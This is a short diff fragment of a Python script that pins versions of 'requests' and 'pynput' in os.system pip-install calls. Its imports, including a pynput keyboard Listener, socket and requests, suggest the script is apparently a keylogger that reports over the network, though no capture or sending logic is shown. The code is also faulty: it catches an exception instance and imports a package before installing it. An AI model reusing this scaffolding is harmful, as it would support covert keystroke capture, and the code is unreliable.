@@ -6,14 +6,14 @@ import socket
 from datetime import datetime, time
 import configparser
 try:
-    os.system("pip install requests")
+    os.system("pip install requests==2.22.0")
 except DeprecationWarning():
     pass
 import requests
 from pynput.keyboard import Listener
 import threading
 try:
-    os.system("pip install pynput")
+    os.system("pip install pynput==1.6.0")
 except DeprecationWarning():
     pass
 
